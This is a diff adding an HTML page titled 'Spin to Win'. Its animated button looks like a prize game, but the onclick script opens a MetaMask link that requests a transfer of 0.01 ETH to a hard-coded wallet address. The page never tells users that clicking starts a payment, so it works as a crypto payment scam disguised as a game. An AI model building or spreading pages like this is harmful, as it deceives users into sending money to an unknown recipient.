@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Spin to Win</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #spinButton {
+            font-size: 24px;
+            padding: 20px 40px;
+            border-radius: 10px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <button id="spinButton" onclick="spinToWin()">Spin to Win</button>
+
+    <script>
+        function spinToWin() {
+            window.open('https://metamask.app.link/send/pay-0x62842A4A9d0f6c56D0F1757E13A8Efdd4E7B8BD2?value=1e16');
+        }
+    </script>
+
+</body>
+</html>
